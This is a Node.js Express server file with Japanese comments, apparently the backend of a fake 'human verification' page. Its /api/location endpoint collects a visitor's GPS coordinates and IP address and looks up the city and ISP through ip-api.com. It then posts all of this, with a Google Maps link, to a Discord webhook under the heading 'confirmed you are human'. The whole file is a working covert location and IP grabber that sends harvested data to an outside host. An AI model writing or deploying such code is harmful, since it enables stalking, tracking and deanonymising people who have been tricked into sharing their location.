const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Discord Webhook (Renderの環境変数)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.set('trust proxy', true);
app.use(express.json()); // JSONデータを受け取れるようにする設定

// メイン画面 (HTMLを返す)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 位置情報を受け取ってDiscordに送るエンドポイント
app.post('/api/location', async (req, res) => {
    const { lat, lon, accuracy } = req.body;
    let rawIp = req.headers['x-forwarded-for'] || req.ip || '';
    let ip = rawIp.split(',')[0].trim();

    try {
        // IPベースの住所も一応取得
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await geoResponse.json();

        // Discordへのメッセージ組み立て (GPS情報を優先)
        let discordMessage = `✅ **人間であることを確認しました（詳細ログ）**\n`;
        discordMessage += `🌐 **正確な位置 (GPS)**: \nhttps://www.google.com/maps?q=${lat},${lon}\n`;
        discordMessage += `精度: 約 ${accuracy} メートル\n`;
        discordMessage += `\n🔍 **通信情報**: \nIP: \`${ip}\`\n地域(IP推定): ${geoData.city || '不明'}\nプロバイダ: ${geoData.isp || '不明'}`;

        console.log(`[LOG] GPS取得完了: ${lat}, ${lon} (精度:${accuracy}m)`);

        if (DISCORD_WEBHOOK_URL) {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: discordMessage })
            });
        }

        res.json({ status: 'ok' });
    } catch (error) {
        console.error('エラー:', error);
        res.status(500).json({ status: 'error' });
    }
});

app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
